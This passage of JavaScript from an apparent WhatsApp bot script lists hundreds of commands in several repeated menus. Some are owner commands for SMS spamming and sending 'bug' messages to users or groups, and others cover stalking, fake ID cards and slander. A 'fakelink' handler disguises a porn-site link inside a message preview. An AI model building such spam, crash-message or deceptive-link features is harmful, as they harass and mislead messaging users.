┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}off_
┣ ◩ _${prefix}on_
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑\n[ Thanks To ]${readmore}\n•Hexagonz\n•Baileys\n•My Friend\n•Kevin gay\n•Manurios\n•Agung ngentod\n•Hans\n•Hans`,
		footerText: '💡 Have a nice day dude 💡\n         菲諾·朱利安·安加拉\n               Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺',
		buttons: buttonMessage99,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
		await hexa.sendMessage(from, iniButton92, MessageType.buttonsMessage, {sendEphemeral:true, quoted: fvideo, contextInfo: {mentionedJid: [nomor2,nomor,sender], externalAdReply:{ title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/fino.jpeg'), mediaUrl: 'https://youtu.be/P_9cu8Gr4LQ'}}})
  break
  case 'tester':
 hexa.updatePresence(from, Presence.recording)
run = process.uptime()
 nomor = `6288210864298@s.whatsapp.net`
 nomor2 = `50587753432@s.whatsapp.net`
var peler999 = `菲諾·朱利安·安加拉${ucapanWaktu} @${sender.split("@")[0]}
\`\`\`⛃⃝🔖Prefix : [ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]\`\`\`
\`\`\`⛃⃝⚙️Status : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]\`\`\`
\`\`\`⛃⃝⏳Activate : [ ${kyun(run)} ]\`\`\`
\`\`\`⛃⃝🔋Baterai : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]\`\`\`
\`\`\`⛃⃝🧾Lib : [ BAILEYS ]\`\`\`
\`\`\`⛃⃝🗒️Language : [ JAVASCRIPT ]*\`\`\`
\`\`\`⛃⃝📱Device : [ ${device_manufacturer} ]\`\`\`
\`\`\`⛃⃝🙋Owner : [ @${nomor2.split("@")[0]} ]\`\`\`

                     ⛃⃝🌏DATE
                      
        \`\`\`⛃⃝🌟 ${ucapanWaktu}\`\`\`
      \`\`\`⛃⃝🗞️ ${time} WIB\`\`\`
   \`\`\`⛃⃝🗞️ ${wit} WIT\`\`\`
\`\`\`⛃⃝🗞️ ${wita} WITA\`\`\`

More??....${readmore}    

		*[ INSTAGRAM TOOLS ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igfollow_
┣ ◩ _${prefix}igunfollow_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}igcomment_
┣ ◩ _${prefix}igimage_
┣ ◩ _${prefix}upinstastory_
┣ ◩ _${prefix}upfeed_
┣ ◩ _${prefix}block_
┣ ◩ _${prefix}unblock_
┣ ◩ _${prefix}igsavepost_
┣ ◩ _${prefix}igunsvpost
┗━━━━━━━━ ❑

		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


     *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}antibule_
┣ ◩ _${prefix}antihidetag_
┣ ◩ _${prefix}antiviewonce_
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_
┣ ◩ _${prefix}kick_
┣ ◩ _${prefix}demote_
┣ ◩ _${prefix}promote_
┣ ◩ _${prefix}add2_
┣ ◩ _${prefix}kick2_
┣ ◩ _${prefix}demote2_
┣ ◩ _${prefix}promote2_
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}closegc_
┣ ◩ _${prefix}opengc_
┗━━━━━━━━ ❑

    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑


    *[ 𝚄𝙿𝚂𝚆 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}off_
┣ ◩ _${prefix}on_
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑`
  hexa.sendMessage(from, cecan, image, {quoted: ftroli, caption: peler999, contextInfo: { mentionedJid: [nomor2], externalAdReply: {title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), mediaUrl: 'https://youtu.be/3w-C0-zVaW8'}}})
  break
  case 'fakelink':
   ler = `ini link pencet aja`
	 hexa.sendMessage(from, ler, text, {sendEphemeral:true, quoted: fvideo, contextInfo: { externalAdReply:{ title: 'ìąʍ ƒìղօ 菲诺', body : '𝑥  999  𝑥', mediaType: 2, thumbnail: fs.readFileSync('./lib/image/cecan.jpeg'), sourceUrl: 'https://xnxx.com/video-p94cb94/step_brother_2'}}})
break
case 'peler2':
 case 'menu5':
  case 'menu2':
  
 run = process.uptime()
 nomor = `6288210864298@s.whatsapp.net`
 nomor2 = `50587753432@s.whatsapp.net`
sendButLoc(from, `                   🌏  Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜  🌍\n\n                  菲諾·朱利安·安加拉\n\n${ucapanWaktu} @${sender.split("@")[0]}
\`\`\`⛃⃝🔖Prefix : [ 𝙼𝚄𝙻𝚃𝙸-𝙿𝚁𝙴𝙵𝙸𝚇 ]\`\`\`
\`\`\`⛃⃝⚙️Status : [ ${banChats == 'true' ? 'PUBLIC' : 'SELF'} ]\`\`\`
\`\`\`⛃⃝⏳Activate : [ ${kyun(run)} ]\`\`\`
\`\`\`⛃⃝🔋Baterai : [ ${baterai.baterai}% ${baterai.cas === 'true' ? 'Charge':'No Charge'} ]\`\`\`
\`\`\`⛃⃝🧾Lib : [ BAILEYS ]\`\`\`
\`\`\`⛃⃝🗒️Language : [ JavaScript]*\`\`\`
\`\`\`⛃⃝📱Device : [ ${device_manufacturer} ]\`\`\`
\`\`\`⛃⃝🙋Owner : [ @${nomor.split("@")[0]} , @${nomor2.split("@")[0]} ]\`\`\`

                     ⛃⃝🌏DATE
                      
        \`\`\`⛃⃝🌟 ${ucapanWaktu}\`\`\`
      \`\`\`⛃⃝🗞️ ${time} WIB\`\`\`
   \`\`\`⛃⃝🗞️ ${wit} WIT\`\`\`
\`\`\`⛃⃝🗞️ ${wita} WITA\`\`\`

More??....${readmore}    

		*[ INSTAGRAM TOOLS ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igfollow_
┣ ◩ _${prefix}igunfollow_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}iglike_
┣ ◩ _${prefix}igcomment_
┣ ◩ _${prefix}igimage_
┣ ◩ _${prefix}upinstastory_
┣ ◩ _${prefix}upfeed_
┣ ◩ _${prefix}block_
┣ ◩ _${prefix}unblock_
┣ ◩ _${prefix}igsavepost_
┣ ◩ _${prefix}igunsvpost
┗━━━━━━━━ ❑

		*[ 𝙼𝙰𝙺𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}sticker_
┣ ◩ _${prefix}swm_ <author|packname>
┣ ◩ _${prefix}take_ <author|packname>
┣ ◩ _${prefix}fdeface_
┣ ◩ _${prefix}ttp_
┣ ◩ _${prefix}ttp2
┣ ◩ _${prefix}ttp3_
┣ ◩ _${prefix}ttp4_
┣ ◩ _${prefix}fakedonald_
┣ ◩ _${prefix}ktpmaker_
┣ ◩ _${prefix}smoji_ <emoji>
┣ ◩ _${prefix}smoji2_ <emoji>
┣ ◩ _${prefix}wasted_ 
┣ ◩ _${prefix}triggered_
┗━━━━━━━━ ❑


     *[ 𝙲𝙾𝙽𝚅𝙴𝚁𝚃 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}toimg_
┣ ◩ _${prefix}tomp3_
┣ ◩ _${prefix}tomp4_
┣ ◩ _${prefix}slow_
┣ ◩ _${prefix}fast_
┣ ◩ _${prefix}reverse_
┣ ◩ _${prefix}tourl_
┗━━━━━━━━ ❑

   *[ 𝙶𝙴𝚃 𝙸𝙼𝙶, 𝚅𝙽, 𝚂𝚃𝙸𝙺 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}getvn_
┣ ◩ _${prefix}listvn_
┣ ◩ _${prefix}getstik_
┣ ◩ _${prefix}liststik_
┣ ◩ _${prefix}getimg_
┣ ◩ _${prefix}listimg
┗━━━━━━━━ ❑

   *[ 𝙶𝙰𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}slot_ (Dalam perbaikan)
┣ ◩ _${prefix}tictacto_ (Dalam perbaikan)
┗━━━━━━━━ ❑

     *[ 𝟏𝟖+ 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}xhamster_
┣ ◩ _${prefix}xhamstersearch_ <query>
┣ ◩ _${prefix}xnxx_
┣ ◩ _${prefix}xnxxsearch_ <query>
┣ ◩ _${prefix}nhentai_
┣ ◩ _${prefix}nhentaisearch_ < kode >
┣ ◩ _${prefix}nhentaipdf_
┣ ◩ _${prefix}nekopoi_
┣ ◩ _${prefix}nekopoisearch_ <query>
┗━━━━━━━━ ❑


 *[ 𝚁𝙰𝙽𝙳𝙾𝙼 𝙸𝙼𝙰𝙶𝙴 & 𝙼𝙰𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}18+image_
┣ ◩ _${prefix}18+image2_
┣ ◩ _${prefix}textpro_
┣ ◩ _${prefix}textpro2_
┣ ◩ _${prefix}logomaker_
┣ ◩ _${prefix}ephoto_
┗━━━━━━━━ ❑ 


     *[ 𝙰𝙽𝙸𝙼𝙴 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}art_
┣ ◩ _${prefix}bts_
┣ ◩ _${prefix}exo_
┣ ◩ _${prefix}elf_
┣ ◩ _${prefix}loli_
┣ ◩ _${prefix}neko_
┣ ◩ _${prefix}waifu_
┣ ◩ _${prefix}shota_
┣ ◩ _${prefix}husbu_
┣ ◩ _${prefix}sagiri_
┣ ◩ _${prefix}shinobu_
┣ ◩ _${prefix}megumin_
┣ ◩ _${prefix}wallnime_
┣ ◩ _${prefix}character_
┣ ◩ _${prefix}manga_
┣ ◩ _${prefix}kusonime_
┣ ◩ _${prefix}kusonimesearch_ <query>
┣ ◩ _${prefix}otakudesu_
┣ ◩ _${prefix}otakudesusearch_ <query>
┣ ◩ _${prefix}anime_
┣ ◩ _${prefix}pixiv_
┣ ◩ _${prefix}pixivdl_
┣ ◩ _${prefix}chara_
┣ ◩ _${prefix}otaku_
┗━━━━━━━━ ❑


      *[ 𝙾𝚃𝙷𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}playstore_
┣ ◩ _${prefix}playstore2_
┣ ◩ _${prefix}shopee_
┣ ◩ _${prefix}infofilm_
┣ ◩ _${prefix}lk21_
┣ ◩ _${prefix}ssweb_
┣ ◩ _${prefix}shortlink_
┣ ◩ _${prefix}ssweb2_
┣ ◩ _${prefix}ceritahoror_ <random>
┣ ◩ _${prefix}wattpad_
┣ ◩ _${prefix}wattpadsearch_ <query>
┣ ◩ _${prefix}drakorongoing_
┣ ◩ _${prefix}covidindo_
┣ ◩ _${prefix}covidglobal_
┣ ◩ _${prefix}asupan_ <random>
┣ ◩ _${prefix}wancak_
┣ ◩ _${prefix}faketoko_
┣ ◩ _${prefix}cuaca_
┣ ◩ _${prefix}infogempa_
┣ ◩ _${prefix}cnninternasional_
┣ ◩ _${prefix}cnnnasional_
┣ ◩ _${prefix}cnnindonesia_
┣ ◩ _${prefix}newsinfo_
┣ ◩ _${prefix}cerpen_
┣ ◩ _${prefix}stickerwa_ <query>
┣ ◩ _${prefix}google_ <query
┣ ◩ _${prefix}lirik_
┣ ◩ _${prefix}lirik2_
┣ ◩ _${prefix}kbbi_
┣ ◩ _${prefix}wikipedia_
┣ ◩ _${prefix}jadwaltv_
┣ ◩ _${prefix}jadwaltvnow_
┣ ◩ _${prefix}jadwalbola_
┣ ◩ _${prefix}kodepos_ <query>
┣ ◩ _${prefix}telesticker_
┗━━━━━━━━ ❑


     *[ 𝙶𝚁𝙾𝚄𝙿 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}antibule_
┣ ◩ _${prefix}antihidetag_
┣ ◩ _${prefix}antiviewonce_
┣ ◩ _${prefix}group_ (open/close)
┣ ◩ _${prefix}add_
┣ ◩ _${prefix}kick_
┣ ◩ _${prefix}demote_
┣ ◩ _${prefix}promote_
┣ ◩ _${prefix}add2_
┣ ◩ _${prefix}kick2_
┣ ◩ _${prefix}demote2_
┣ ◩ _${prefix}promote2_
┣ ◩ _${prefix}tagall_
┣ ◩ _${prefix}tagall2_
┣ ◩ _${prefix}tagall3_
┣ ◩ _${prefix}tagall4_
┣ ◩ _${prefix}tagall5_
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}grup_ (open/close)
┣ ◩ _${prefix}closegc_
┣ ◩ _${prefix}opengc_
┗━━━━━━━━ ❑

    *[ 𝙸𝚂𝙻𝙰𝙼 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}asmaulhusna_ <query>
┣ ◩ _${prefix}kisahnabi_ <query>
┣ ◩ _${prefix}jadwalsholat_ <query>
┣ ◩ _${prefix}alquran_
┣ ◩ _${prefix}alquranaudio_
┣ ◩ _${prefix}listsurah_
┗━━━━━━━━ ❑


    *[ 𝚄𝙿𝚂𝚆 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}upswteks_
┣ ◩ _${prefix}upswimage_
┣ ◩ _${prefix}upswvideo_
┣ ◩ _${prefix}upswlokasi_
┣ ◩ _${prefix}upswaudio_
┣ ◩ _${prefix}upswvoice_
┣ ◩ _${prefix}upswsticker_
┗━━━━━━━━ ❑

    *[ 𝙵𝚄𝙽 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}fitnah_
┣ ◩ _${prefix}fitnahpc_
┣ ◩ _${prefix}kontak_
┗━━━━━━━━ ❑

    *[ 𝚃𝙰𝙶 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}hidetag_
┣ ◩ _${prefix}kontag_
┣ ◩ _${prefix}sticktag_
┣ ◩ _${prefix}totag_
┗━━━━━━━━ ❑

  *[ 𝚂𝚃𝙰𝙻𝙺𝙴𝚁 𝙼𝙴𝙽𝚄 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}igstalk_ <query>
┣ ◩ _${prefix}tiktokstalk_ <query>
┣ ◩ _${prefix}githubstalk_ <query>
┣ ◩ _${prefix}twitterstalk_ <query>
┗━━━━━━━━ ❑

     *[ 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}ytsearch_ <query>
┣ ◩ _${prefix}play_ <query>
┣ ◩ _${prefix}spotify_ <quert>
┣ ◩ _${prefix}spotifysearch_ <query>
┣ ◩ _${prefix}joox_ <query>
┣ ◩ _${prefix}jooxsearch_ <query>
┣ ◩ _${prefix}video_ <query>
┣ ◩ _${prefix}ytmp3_ <link>
┣ ◩ _${prefix}igvideo_ <link>
┣ ◩ _${prefix}igdl_ <link>
┣ ◩ _${prefix}igdl2_ <link>
┣ ◩ _${prefix}igstory_ <username>
┣ ◩ _${prefix}igimage_ <link>
┣ ◩ _${prefix}igaudio_ <link>
┣ ◩ _${prefix}ytmp4_ <link>
┣ ◩ _${prefix}ig_ <link>
┣ ◩ _${prefix}pinterest_
┣ ◩ _${prefix}pinterest2_
┣ ◩ _${prefix}pinterest3_
┣ ◩ _${prefix}pinterestdl_
┣ ◩ _${prefix}twitter_ <link>
┣ ◩ _${prefix}twtdl_
┣ ◩ _${prefix}tiktok_ <link>
┣ ◩ _${prefix}tiktokvideo_ <link>
┣ ◩ _${prefix}tiktokaudio_ <link>
┣ ◩ _${prefix}fb_ <link>
┣ ◩ _${prefix}brainly_ <query>
┣ ◩ _${prefix}image_ <query>
┣ ◩ _${prefix}anime_ <random>
┗━━━━━━━━ ❑

    *[ 𝙾𝚆𝙽𝙴𝚁 ]*
┏━━━━━━━ ❒
┣ ◩ _${prefix}spamsms_
┣ ◩ _${prefix}sendbug_
┣ ◩ _${prefix}sendbug2_
┣ ◩ _${prefix}buggc_
┣ ◩ _${prefix}owner_
┣ ◩ _${prefix}stat_ 
┣ ◩ _${prefix}off_
┣ ◩ _${prefix}on_
┣ ◩ _${prefix}status_
┣ ◩ _${prefix}self_
┣ ◩ _${prefix}public_
┣ ◩ _${prefix}setthumb_
┣ ◩ _${prefix}settarget_
┣ ◩ _${prefix}setfakeimg_
┣ ◩ _${prefix}setreply_
┣ ◩ _${prefix}ping_
┣ ◩ _${prefix}inspect_
┣ ◩ _${prefix}join_
┣ ◩ _${prefix}get_
┣ ◩ _${prefix}term_ <code>
┣ ◩ _x_ < java script code >
┗━━━━━━━━ ❑`, "💡 Have a nice day dude 💡\n       菲諾·朱利安·安加拉\n             Ǐ͜ɑ͓ͥɱͣ͢F͊Ì͓ɳͫ𝑜 菲诺", {jpegThumbnail:fs.readFileSync('./lib/image/fino.jpeg')}, 
[{buttonId:`${prefix}owner2`,buttonText:{displayText: '👤 𝑶𝑾𝑵𝑬𝑹 👤'},type:1},{buttonId:`${prefix}call`,buttonText:{displayText:'⚙️ 𝑺𝑻𝑨𝑻𝑰𝑺𝑻𝑰𝑪 ⚙️'},type:1},{buttonId:`${prefix}stat`,buttonText:{displayText:'🖨️ 𝑺𝑪𝑹𝑰𝑷𝑻 🖨'},type:1},{buttonId:`${prefix}source`}], {contextInfo: { mentionedJid: [nomor,nomor2]}})
break

